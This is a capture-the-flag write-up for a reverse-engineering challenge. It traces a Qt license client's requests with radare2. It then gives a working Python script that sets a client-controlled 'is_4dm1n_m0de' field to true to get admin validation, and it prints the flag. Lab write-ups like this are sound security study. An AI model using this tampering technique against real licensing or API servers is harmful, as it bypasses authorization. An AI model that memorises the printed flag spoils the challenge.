# License 2.0

## Challenge Information

Last time, someone said my license activation program so easy to crack it. So, I enhanced it in this time.

- Author: SalaryThief
- Flag Format: `PUCTF26{[a-zA-Z0-9_]+_[a-fA-F0-9]{32}}`
- Category: `Reverse Engineering`

# Overview

This challenge is not really about making a keygen. The real issue is that the server trusts a privilege field controlled by the client.

The file is a Windows Qt license activation program. At first it looks like a normal software cracking challenge, it enter a license key, click Activate, and the program checks if the key is valid. That setup makes it easy to think about local checks, key format rules, or a keygen.

After some analysis, the important part was clearly not the GUI itself, but the verification flow behind it. The program first gets `server_time` from the server, then sends `license_key`, `server_time`, and `is_4dm1n_m0de` to `/license/verify`. The problem is obvious **a permission-related field like `is_4dm1n_m0de` should never be decided by the client.**

So even though this is a reverse engineering challenge, the real work is closer to:

- recovering the client/server verification flow from the binary
- finding the request payload structure
- checking whether the server trusts a client-controlled security field

Once that is clear, the direction is simple. I do not need to compute a real license key. I only need to rebuild a valid request and abuse `is_4dm1n_m0de` to get the flag.

# Initial Analysis

## File type confirm

I first confirmed the archive type and the main program type.

Commands used:

```bash
file ./*
unzip -l "License_v2.zip"
mkdir -p extracted && unzip -o "License_v2.zip" -d extracted
file "extracted/QtLicense.exe"
```

output:

```text
./License_v2.zip: Zip archive data, at least v1.0 to extract, compression method=store
extracted/QtLicense.exe: PE32+ executable for MS Windows 6.00 (GUI), x86-64, 6 sections
```

This confirms two things:

1. The attachment is really a zip archive.
2. The main file is a Windows x64 GUI PE executable.

## ZIP file confirmed - Magic number

I also checked the zip magic number.

```bash
xxd -l 16 "License_v2.zip"
```

Output:

```text
00000000: 504b 0304 0a00 0000 0000 ea7d 315b 0000  PK.........}1[.. 
```

`50 4b 03 04` is the zip local file header signature.

### First look at strings

Next I started with `strings` command.

```bash
strings "QtLicense.exe"
```

We got something very important:

```text
https://chal.polyuctf.com:11337
/license/verify
license_key
server_time
is_4dm1n_m0de
Please enter license key.
Cannot get time.
License key is valid.
License key is incorrect.
Server time mismatch. Please try again.
bf4f520d495cf025a7017b51c581e254c4b2ec5f22e138dd922c23575d6804c6
```

These strings already tell a lot:

- the program connects to `https://chal.polyuctf.com:11337`
- `license_key` and `server_time`
- verification involves `/license/verify`
- there is a very suspicious field named `is_4dm1n_m0de`, is that for the admin verify step?

From this alone, one important point is already clear:

> The challenge looks like a Windows Qt application, but the real core is not the Windows GUI. The real core is the HTTP API and the server verification logic behind it.

The most useful strings are not GUI widget names or Win32 details. The useful strings are:

- HTTPS endpoint
- API path
- JSON keys
- server response messages

So this reverse challenge is really about recovering the client/server protocol from the binary, not about Windows GUI internals.

These strings also already suggest the challenge style. It feels much closer to a software activation or cracking task:

1. find the activation-related fields
2. find how the program talks to the verifier
3. decide whether the real check is local or server-side

When I saw `License`, `license_key`, `/license/verify`, and `server_time` together, my first guess was already simple

- this probably is not about computing a valid key.
- It is more likely about bypassing, or directly abusing, the verification step.

At this stage my working ideas were:

- this is probably not a pure local key check
- `license_key` is probably only one part of the payload
- `server_time` is probably required by the server-side flow
- the real weakness is probably in the request structure or trust boundary

The later `radare2` work was mainly used to confirm that this guess was correct.

`radare2` for strings containing `time`:

```bash
r2 -q -c "aaa; iz~time" "extracted/QtLicense.exe"

WARN: Relocs has not been applied. Please use `-e bin.relocs.apply=true` or `-e bin.cache=true` next time
INFO: Analyze all flags starting with sym. and entry0 (aa)
INFO: Analyze imports (af@@@i)
INFO: Analyze entrypoint (af@ entry0)
INFO: Analyze symbols (af@@@s)
INFO: Analyze all functions arguments/locals (afva@@@F)
INFO: Analyze function calls (aac)
INFO: Analyze len bytes of instructions for references (aar)
INFO: Finding and parsing C++ vtables (avrr)
INFO: Analyzing methods (af @@ method.*)
INFO: Recovering local variables (afva@@@F)
INFO: Type matching analysis for all functions (aaft)
INFO: Propagate noreturn information (aanr)
INFO: Use -AA or aaaa to perform additional experimental analysis
24   0x00005658 0x140006e58 11  12   .rdata  ascii   server_time
25   0x00005668 0x140006e68 16  17   .rdata  ascii   Cannot get time.
26   0x0000567c 0x140006e7c 5   6    .rdata  ascii   /time
35   0x00005700 0x140006f00 13  14   .rdata  ascii   time_mismatch
36   0x00005710 0x140006f10 39  40   .rdata  ascii   Server time mismatch. Please try again.
1943 0x0001e1b4 0x14001f9b4 55  56   .rdata  ascii   \e ?timerEvent@QAbstractButton@@MEAAXPEAVQTimerEvent@@@Z
2058 0x0001f6c8 0x140020ec8 45  46   .rdata  ascii   ?timerEvent@QObject@@MEAAXPEAVQTimerEvent@@@Z
2165 0x00020496 0x140021c96 33  34   .rdata  ascii   api-ms-win-crt-runtime-l1-1-0.dll
```

### What we know now

At this point, my conclusion from now are:

1. This is not a pure local license check.
2. The GUI is probably only a frontend, while the real verification happens on the server.
3. `is_4dm1n_m0de` is probably the key weakness, because privilege-related information should not be controlled by the client.

## Tracing the network flow with radare2

Then I used `radare2` to confirm what the GUI actually does.

The most important rule in this part is:

- I did not start with function addresses and then search for strings.
- I started with string addresses, then used those addresses to find the functions.

So none of the important addresses appear out of nowhere. Each one comes from the previous step.

After one more round with `radare2`, the picture becomes much clearer:

- `fcn.140001e70` handles user input and then requests `/time`
- `fcn.140002330` builds the JSON for `/license/verify`
- xrefs around `status` and `message` lead to response handling code

So again, the reverse work is really about how the binary sends data to the server and how it interprets the reply.

Commands used:

```bash
r2 -q -c "aaa; afl~QtLicense; iz~license; iz~verify; iz~time" "extracted/QtLicense.exe"
r2 -q -c "aaa; axt 0x140006e28; axt 0x140006e7c" "extracted/QtLicense.exe"
r2 -q -c "aaa; axt 0x140006f98; axt 0x140006fc0; axt 0x140006e58" "extracted/QtLicense.exe"
r2 -q -c "aaa; axt 0x140006ec8; axt 0x140006ed0; axt 0x140006ed8" "extracted/QtLicense.exe"
r2 -q -c "aaa; s 0x140001e70; pdf" "extracted/QtLicense.exe"
r2 -q -c "aaa; s 0x140002330; pdf" "extracted/QtLicense.exe"
```

The core workflow is:

```text
string -> string address -> xref -> function address -> disassemble function
```

### String addresses used in this part

These addresses all come from `iz` output:

```bash
r2 -q -c "aaa; afl~QtLicense; iz~license; iz~verify; iz~time" "extracted/QtLicense.exe"
```

The values I actually used are:

```asm
0x140006e28   Please enter license key.
0x140006e58   server_time
0x140006e7c   /time
0x140006ec8   status
0x140006ed0   message
0x140006ed8   License key is valid.
0x140006f98   /license/verify
0x140006fc0   license_key
```

To more cleanly to see:

```asm
0x140006c38 -> Please input the license key to activate this software:
# Main GUI description text, not important for the exploit

0x140006e28 -> Please enter license key.
# Message shown when the input is empty
# Later used with axt to reach fcn.140001e70

0x140006e58 -> server_time
# JSON key name used in the verify request
# Later used with axt to reach fcn.140002330

0x140006e68 -> Cannot get time.
# Error message when /time fails
# Helpful clue for the /time flow

0x140006e7c -> /time
# First API path
# Later used with axt to reach fcn.140001e70

0x140006ec8 -> status
# JSON field name in the server response
# Later used with axt to locate response parsing

0x140006ed0 -> message
# JSON field name in the server response
# Later used with axt to locate response parsing

0x140006ed8 -> License key is valid.
# Success message shown by the GUI
# Later used with axt to confirm success handling

0x140006f00 -> time_mismatch
# String used when the server returns status = time_mismatch

0x140006f10 -> Server time mismatch. Please try again.
# GUI message for time_mismatch

0x140006f98 -> /license/verify
# Verify API path
# Later used with axt to reach fcn.140002330

0x140006fc0 -> license_key
# JSON key name used in the verify request
# Later used with axt to reach fcn.140002330
```

### `0x140001e70`

The first thing I wanted to trace was input checking and `/time`. So I started with these two string addresses from `iz`:

```text
0x140006e28   Please enter license key.
0x140006e7c   /time
```

Then I checked cross references:

```bash
r2 -q -c "aaa; axt 0x140006e28; axt 0x140006e7c" "extracted/QtLicense.exe"
```

Only after this step did `0x140001e70` appear. Its source is not `iz`. Its source is `axt`. In other words:

- `0x140001e70` is the function start that references both `0x140006e28` and `0x140006e7c`

Both strings point to `fcn.140001e70`. That is important because this function contains:

- the empty-input warning string
- the first API path `/time`

That strongly suggests that `fcn.140001e70` is the main Activate-button flow:

1. read the input box
2. if the string is empty, show `Please enter license key.`
3. otherwise, start the request to `/time`

So `0x140001e70` was not guessed. It was derived from xrefs to `Please enter license key.` and `/time`.

After that, I opened the function:

```bash
r2 -q -c "aaa; s 0x140001e70; pdf" "extracted/QtLicense.exe"
```

And it shown:

```text
Please enter license key. -> 0x140006e28 -> axt -> fcn.140001e70
/time                    -> 0x140006e7c -> axt -> fcn.140001e70
```

### `0x140002330`

The second function I wanted was the verify request builder. So I started with these three string addresses from `iz`:

```text
0x140006f98   /license/verify
0x140006fc0   license_key
0x140006e58   server_time
```

Source of these addresses:

- `0x140006f98` comes from `iz`, for `/license/verify`
- `0x140006fc0` comes from `iz`, for `license_key`
- `0x140006e58` comes from `iz`, for `server_time`

Then I checked cross references:

```bash
r2 -q -c "aaa; axt 0x140006f98; axt 0x140006fc0; axt 0x140006e58" "extracted/QtLicense.exe"
```

- `0x140002330` is the function start that references `/license/verify`, `license_key`, and `server_time`

These strings all point to `fcn.140002330`, which means this function:

- knows the verify API path
- knows the JSON key names
- is very likely building the verification request

So I opened it with:

```bash
r2 -q -c "aaa; s 0x140002330; pdf" "extracted/QtLicense.exe"
```

The provenance here is:

```text
/license/verify -> 0x140006f98 -> axt -> fcn.140002330
license_key     -> 0x140006fc0 -> axt -> fcn.140002330
server_time     -> 0x140006e58 -> axt -> fcn.140002330
```

After reading the function, the request can be summarized as:

```json
{
  "license_key": "<trimmed input>",
  "server_time": "<value from /time>",
  "is_4dm1n_m0de": false
}
```

As soon as I saw that `is_4dm1n_m0de` was sent by the client, the direction was obvious:

> If the server trusts this field, then the server is letting the client decide its own privilege.

### `0x140006ec8`

`0x140006ec8` is not a function. It is the address of the string `status` in `.rdata`.

- `0x140006ec8` -> `status`
- `0x140006ed0` -> `message`
- `0x140006ed8` -> `License key is valid.`

I checked these because I wanted to see how the GUI handles the server response. I used:

```bash
r2 -q -c "aaa; axt 0x140006ec8; axt 0x140006ed0; axt 0x140006ed8" "extracted/QtLicense.exe"
```

The mapping is:

- `0x140006ec8` -> `status`
- `0x140006ed0` -> `message`
- `0x140006ed8` -> `License key is valid.`

This leads straight to the response handler and shows that the GUI reads:

- `ok`
- `status`
- `message`

So the client is only displaying the server response. The real decision still belongs to the server.

The rule is the same again:

```text
first get the string address from iz, then use axt to find the code that references it
```

So the provenance can be written as:

```asm
status                -> 0x140006ec8 -> axt -> near the response parser
message               -> 0x140006ed0 -> axt -> near the response parser
License key is valid. -> 0x140006ed8 -> axt -> near the response parser
```

### Reading `lea rdx, str.xxx`

In `pdf` output, I often saw instructions like this:

```text
lea rdx, str._time
lea rdx, str._license_verify
lea rdx, str.license_key
lea rdx, str.status
```

More precisely, the amount of assembly needed here is small:

- see `lea rdx, str.xxx` and know a specific string is being used
- see function calls and infer that the code is building a request or reading a response
- see simple branches and understand the rough success or failure split

So this challenge does not require heavy low-level assembly analysis. A small amount of disassembly is enough to support the exploit.

### Using a small amount of asm to confirm the idea

Even though the challenge does not require deep assembly work, I still used a few real snippets to confirm that the earlier conclusions were not just guesses.

In `fcn.140001e70`, I wanted to see:

- a reference to `Please enter license key.`
- a reference to `/time`
- both of them inside the same function

If both appear inside the same function:

```text
0x140001ecf      lea rdx, str.Please_enter_license_key.  ; 0x140006e28 ; "Please enter license key."
...
0x140001f69      lea rdx, str._time                      ; 0x140006e7c ; "/time"
```

then I can already confirm that the function handles:

- the empty-input message
- the first time request

Real disassembly snippet:

```text
0x140001eca      cmp dword [rax + 4], esi
0x140001ecd      jne 0x140001f29
0x140001ecf      lea rdx, str.Please_enter_license_key.  ; 0x140006e28 ; "Please enter license key."
...
0x140001f69      lea rdx, str._time                      ; 0x140006e7c ; "/time"
0x140001f86      call qword [sym.imp.Qt5Core.dll_public:_void___cdecl_QUrl::constructor_class_QString_const____ptr64__enum_QUrl::ParsingMode____ptr64]
```

This can be read in a simple way:

- there is a `cmp` / `jne`, so there is a conditional split
- one branch uses `Please enter license key.`
- another part builds a `QUrl` from `"/time"`

Likewise, in `fcn.140002330`, I wanted to see whether these show up together:

```text
0x14000235a      lea rdx, str._license_verify   ; 0x140006f98 ; "/license/verify"
0x1400023b4      lea rdx, str.application_json  ; 0x140006fa8 ; "application/json"
0x14000243f      lea rdx, str.license_key       ; 0x140006fc0 ; "license_key"
```

disassembly:

```text
0x14000235a      lea rdx, str._license_verify   ; 0x140006f98 ; "/license/verify"
0x140002377      call qword [sym.imp.Qt5Core.dll_public:_void___cdecl_QUrl::constructor_class_QString_const____ptr64__enum_QUrl::ParsingMode____ptr64]
0x1400023ad      call qword [sym.imp.Qt5Network.dll_public:_void___cdecl_QNetworkRequest::constructor_class_QUrl_const____ptr64____ptr64]
0x1400023b4      lea rdx, str.application_json  ; 0x140006fa8 ; "application/json"
0x1400023d0      call qword [sym.imp.Qt5Network.dll_public:_void___cdecl_QNetworkRequest::setHeader_enum_QNetworkRequest::KnownHeaders__class_QVariant_const____ptr64____ptr64]
0x14000243f      lea rdx, str.license_key       ; 0x140006fc0 ; "license_key"
0x14000245d      call qword [sym.imp.Qt5Core.dll_public:_class_QJsonValueRef___cdecl_QJsonObject::operator___class_QString_const____ptr64____ptr64]
```

These strings and calls are enough to support the conclusion:

- this function is building the `/license/verify` request
- the payload includes `license_key`, and later writes other fields too

Finally, in the response handling part, I checked whether the code reads:

```text
0x1400029b7      lea rdx, [0x140006ec4] ; "ok"
0x1400029ff      lea rdx, str.status    ; 0x140006ec8 ; "status"
0x140002a47      lea rdx, str.message   ; 0x140006ed0 ; "message"
0x140002aa4      lea rdx, str.License_key_is_valid. ; 0x140006ed8 ; "License key is valid."
```

More:

```text
0x1400029b7      lea rdx, [0x140006ec4] ; "ok"
0x1400029d5      call qword [sym.imp.Qt5Core.dll_public:_class_QJsonValue___cdecl_QJsonObject::value_class_QString_const____ptr64____ptr64]
0x1400029e1      call qword [sym.imp.Qt5Core.dll_public:_bool___cdecl_QJsonValue::toBool_bool_const___ptr64]
0x1400029ff      lea rdx, str.status    ; 0x140006ec8 ; "status"
0x140002a47      lea rdx, str.message   ; 0x140006ed0 ; "message"
0x140002aa4      lea rdx, str.License_key_is_valid. ; 0x140006ed8 ; "License key is valid."
```

That locks in the whole reasoning chain:

- the first function sends `/time`
- the second function sends `/license/verify`
- the later code reads `status` and `message`

So the purpose of the assembly here is not to fully reconstruct the program. It is only to confirm that the understanding from strings and JSON behavior is correct.

## Try and Error with Response

After I understood the verify request structure, I tested the conditions needed for the exploit. In practice, the challenge can be solved with API probing plus a small amount of reverse work to confirm the request and response structure.

### Testing `/time`

First I tested `/license/verify` with a fake `server_time`:

```json
{
  "license_key": "test",
  "server_time": "0",
  "is_4dm1n_m0de": false
}
```

The server replied:

```json
{
  "ok": false,
  "status": "invalid_time_format",
  "message": "Invalid server_time format. Expected ISO 8601 UTC string."
}
```

This proves that `/time` is not just decoration. It is required. To exploit the challenge successfully, I need a valid `server_time` first.

### Does the license key need to be real?

Then I tested `/license/verify` with some random keys:

```json
{
  "ok": false,
  "status": "invalid_format",
  "message": "Invalid license key format. Expected XXXXX-XXXXX-XXXXX-XXXXX-XXXXX."
}
```

So I only need a fake key with the correct format, for example:

```text
AAAAA-AAAAA-AAAAA-AAAAA-AAAAA
```

## Exploitation / Solution

### Talking to the API directly

Since the GUI ultimately only calls `/time` and `/license/verify`, I can just call the API myself.

### Check `/time` and `/license/verify`

```bash
python3 - <<'PY'
import requests

base = 'https://chal.polyuctf.com:11337'

r = requests.get(base + '/time', timeout=15, verify=False)
print('/time =>', r.status_code, r.text)

rr = requests.post(
    base + '/license/verify',
    json={
        'license_key': 'test',
        'server_time': '0',
        'is_4dm1n_m0de': False,
    },
    timeout=15,
    verify=False,
)
print('/license/verify =>', rr.status_code, rr.text)
PY
```

This confirms:

- `/time` returns an ISO 8601 UTC timestamp
- `/license/verify` accepts JSON
- both `server_time` and `license_key` are format-checked

### Testing `is_4dm1n_m0de`

Then I changed the payload to:

```json
{
  "license_key": "AAAAA-AAAAA-AAAAA-AAAAA-AAAAA",
  "server_time": "2026-03-07T12:24:27.502422+00:00",
  "is_4dm1n_m0de": true
}
```

### That worked!

After keeping at it for a bit, we finally got the flag with this exploit. (See it on exploit.py)

```python
import json
import requests

BASE_URL = "https://chal.polyuctf.com:11337"

def main() -> None:
    requests.packages.urllib3.disable_warnings()  # type: ignore[attr-defined]
    r = requests.get(f"{BASE_URL}/time", timeout=15, verify=False)
    time_data = r.json()
    print(f"/time => {r.status_code}")
    print(json.dumps(time_data, indent=2, sort_keys=True))
    server_time = time_data["server_time"]

    rr = requests.post(
        f"{BASE_URL}/license/verify",
        json={
            "license_key": "AAAAA-AAAAA-AAAAA-AAAAA-AAAAA",
            "server_time": server_time,
            "is_4dm1n_m0de": True,
        },
        timeout=15,
        verify=False,
    )
    print(f"/license/verify => {rr.status_code}")
    print(json.dumps(rr.json(), indent=2, sort_keys=True))

if __name__ == "__main__":
    main()
```

and the output:

```json
/time => 200
{
  "server_time": "2026-03-15T15:48:24.781475+00:00"
}
/license/verify => 200
{
  "message": "Admin mode active: License key accepted. \r\n Here is your flag: PUCTF26{y0u_hv_4ct1v4t3d_w1th0ut_4_k3y_a9f3c4b1e7d28f5096bc1a4e3d5f8c72}",
  "ok": true,
  "status": "valid_admin"
}
```

## Flag

```text
PUCTF26{y0u_hv_4ct1v4t3d_w1th0ut_4_k3y_a9f3c4b1e7d28f5096bc1a4e3d5f8c72}
```

### Hash?

There is also a SHA-256 value inside the binary:

```text
bf4f520d495cf025a7017b51c581e254c4b2ec5f22e138dd922c23575d6804c6
```

I checked it with:

```bash
openssl s_client -connect chal.polyuctf.com:11337 -servername chal.polyuctf.com < /dev/null 2>/dev/null | openssl x509 -pubkey -noout | openssl pkey -pubin -outform DER | openssl dgst -sha256
```

The result matches the constant in the binary, which means the GUI really does public key pinning.

But this does not related to the final exploit. I do not need to intercept the GUI traffic. I only need to understand the request structure and then send the API requests myself.

### solve.py

The `solve.py` file in this directory does the full exploit:

1. get a valid `server_time` from `/time`
2. send a correctly formatted fake key to `/license/verify`
3. set `is_4dm1n_m0de` to `true`
4. extract the flag from the response
